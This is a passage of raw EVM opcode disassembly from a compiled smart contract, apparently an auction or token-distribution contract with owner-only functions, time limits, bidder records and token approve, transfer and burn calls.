PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x108C JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x111A JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x11C0 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x6 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH3 0x1302 JUMPI PUSH1 0x5 SLOAD PUSH1 0x3C PUSH1 0x3 SLOAD TIMESTAMP PUSH3 0x1208 SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST PUSH3 0x1214 SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST PUSH3 0x1220 SWAP2 SWAP1 PUSH3 0x2241 JUMP JUMPDEST PUSH32 0x0 PUSH3 0x124D SWAP2 SWAP1 PUSH3 0x22C5 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SGT ISZERO DUP1 PUSH3 0x1287 JUMPI POP PUSH32 0x0 PUSH1 0x0 SLOAD SGT ISZERO JUMPDEST ISZERO PUSH3 0x12B5 JUMPI PUSH32 0x0 PUSH1 0x0 DUP2 SWAP1 SSTORE POP JUMPDEST PUSH32 0x7CDA8554820EF0A356899263AEFA9DB86AB6966B7B823EDA047B78C3AFDFEB8E PUSH1 0x3 SLOAD TIMESTAMP PUSH3 0x12E6 SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH3 0x12F9 SWAP3 SWAP2 SWAP1 PUSH3 0x230F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH3 0x1336 PUSH3 0x11DE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP PUSH1 0x0 JUMPDEST PUSH1 0x1 SLOAD DUP2 LT ISZERO PUSH3 0x15E0 JUMPI PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x1371 SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST DUP3 LT PUSH3 0x140F JUMPI PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x139E SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x13DE SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST DUP3 PUSH3 0x13EB SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST SWAP2 POP PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP PUSH3 0x152B JUMP JUMPDEST PUSH1 0x0 DUP3 GT DUP1 ISZERO PUSH3 0x1444 JUMPI POP PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x1441 SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST DUP3 LT JUMPDEST ISZERO PUSH3 0x14D2 JUMPI DUP2 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP2 POP PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH3 0x148F SWAP2 SWAP1 PUSH3 0x233C JUMP JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x14B2 SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP PUSH3 0x152A JUMP JUMPDEST PUSH1 0x0 DUP3 GT PUSH3 0x1529 JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x8 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST JUMPDEST PUSH32 0xB24B09FD2E8E4D8904C3C26F3E935824E032891520FFDA419DEC9F086B0E1EEA PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD PUSH1 0x40 MLOAD PUSH3 0x15C2 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x1E7F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 DUP1 DUP1 PUSH3 0x15D7 SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 POP POP PUSH3 0x1340 JUMP JUMPDEST POP PUSH1 0x0 DUP2 GT ISZERO PUSH3 0x15F8 JUMPI DUP1 PUSH1 0x4 DUP2 SWAP1 SSTORE POP PUSH3 0x164A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0x1621 JUMPI PUSH3 0x1620 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x4 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x6 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x16D5 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x1765 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 JUMPDEST PUSH1 0x1 SLOAD DUP2 LT ISZERO PUSH3 0x1A49 JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD GT ISZERO PUSH3 0x1A33 JUMPI PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH8 0xDE0B6B3A7640000 PUSH1 0x8 PUSH1 0x0 DUP7 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH3 0x183C SWAP2 SWAP1 PUSH3 0x233C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x185B SWAP3 SWAP2 SWAP1 PUSH3 0x2387 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x187B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x18A1 SWAP2 SWAP1 PUSH3 0x23E5 JUMP JUMPDEST POP PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD ADDRESS PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH8 0xDE0B6B3A7640000 PUSH1 0x8 PUSH1 0x0 DUP8 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH3 0x1944 SWAP2 SWAP1 PUSH3 0x233C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x1964 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x2417 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x1984 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x19AA SWAP2 SWAP1 PUSH3 0x23E5 JUMP JUMPDEST POP PUSH32 0x39B13884CBCEA684931B2BCFF6FAAB7170693E1BC173E651E14168C890C7080 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH1 0x40 MLOAD PUSH3 0x1A2A SWAP3 SWAP2 SWAP1 PUSH3 0x2387 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST DUP1 DUP1 PUSH3 0x1A40 SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 POP POP PUSH3 0x1770 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0x1A75 JUMPI PUSH3 0x1A74 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST MUL OR SWAP1 SSTORE POP PUSH3 0x1A84 PUSH3 0x132C JUMP JUMPDEST PUSH3 0x1A8E PUSH3 0x4D8 JUMP JUMPDEST PUSH3 0x1A98 PUSH3 0x176D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x4 SLOAD GT ISZERO PUSH3 0x1B3A JUMPI PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9DC29FAC ADDRESS PUSH1 0x4 SLOAD PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x1B05 SWAP3 SWAP2 SWAP1 PUSH3 0x2387 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH3 0x1B20 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH3 0x1B35 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH32 0x99D9AED25B1415A4A35A1890D2EE6AA1DB28F98BA8EFF1DE3D494A6AF9DCA772 PUSH1 0x1 SLOAD PUSH1 0x4 SLOAD SELFBALANCE PUSH1 0x40 MLOAD PUSH3 0x1B73 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x2454 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH2 0x1EF0 DUP1 PUSH3 0x2492 DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x2 DUP2 LT PUSH3 0x1BCE JUMPI PUSH3 0x1BCD PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH3 0x1BE1 DUP3 PUSH3 0x1BBA JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1BF3 DUP3 PUSH3 0x1BD1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1C05 DUP2 PUSH3 0x1BE6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x1C22 PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x1BFA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1C3D DUP2 PUSH3 0x1C28 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x1C5A PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x1C32 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1C75 DUP2 PUSH3 0x1C60 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x1C92 PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH3 0x1CA8 DUP2 PUSH3 0x1C60 JUMP JUMPDEST DUP2 EQ PUSH3 0x1CB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH3 0x1CC8 DUP2 PUSH3 0x1C9D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x1CE7 JUMPI PUSH3 0x1CE6 PUSH3 0x1C98 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x1CF7 DUP5 DUP3 DUP6 ADD PUSH3 0x1CB7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1D2D DUP3 PUSH3 0x1D00 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1D3F DUP2 PUSH3 0x1D20 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1D5C DUP2 PUSH3 0x1D45 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xC0 DUP3 ADD SWAP1 POP PUSH3 0x1D79 PUSH1 0x0 DUP4 ADD DUP10 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x1D88 PUSH1 0x20 DUP4 ADD DUP9 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x1D97 PUSH1 0x40 DUP4 ADD DUP8 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x1DA6 PUSH1 0x60 DUP4 ADD DUP7 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x1DB5 PUSH1 0x80 DUP4 ADD DUP6 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x1DC4 PUSH1 0xA0 DUP4 ADD DUP5 PUSH3 0x1D51 JUMP JUMPDEST SWAP8 SWAP7 POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x1DE9 JUMPI PUSH3 0x1DE8 PUSH3 0x1C98 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x1DF9 DUP6 DUP3 DUP7 ADD PUSH3 0x1CB7 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH3 0x1E0C DUP6 DUP3 DUP7 ADD PUSH3 0x1CB7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x1E2D PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x1D34 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1E50 PUSH1 0x0 DUP4 PUSH3 0x1E33 JUMP JUMPDEST SWAP2 POP PUSH3 0x1E5D DUP3 PUSH3 0x1E3E JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1E75 DUP3 PUSH3 0x1E41 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0x1E96 PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x1EA5 PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x1EB4 PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1EF8 DUP3 PUSH3 0x1C60 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH3 0x1F2D JUMPI PUSH3 0x1F2C PUSH3 0x1EBC JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x62696456616C7565206C657373207468616E2030000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1F81 PUSH1 0x14 DUP4 PUSH3 0x1F38 JUMP JUMPDEST SWAP2 POP PUSH3 0x1F8E DUP3 PUSH3 0x1F49 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH3 0x1FB4 DUP2 PUSH3 0x1F72 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1FC8 DUP3 PUSH3 0x1C60 JUMP JUMPDEST SWAP2 POP PUSH3 0x1FD5 DUP4 PUSH3 0x1C60 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH3 0x1FF0 JUMPI PUSH3 0x1FEF PUSH3 0x1EBC JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x74696D6520697320757000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x202E PUSH1 0xA DUP4 PUSH3 0x1F38 JUMP JUMPDEST SWAP2 POP PUSH3 0x203B DUP3 PUSH3 0x1FF6 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH3 0x2061 DUP2 PUSH3 0x201F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x5468657265206973206E6F206D6F726520616C676F73206C6566740000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x20A0 PUSH1 0x1B DUP4 PUSH3 0x1F38 JUMP JUMPDEST SWAP2 POP PUSH3 0x20AD DUP3 PUSH3 0x2068 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH3 0x20D3 DUP2 PUSH3 0x2091 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0x20F1 PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x2100 PUSH1 0x20 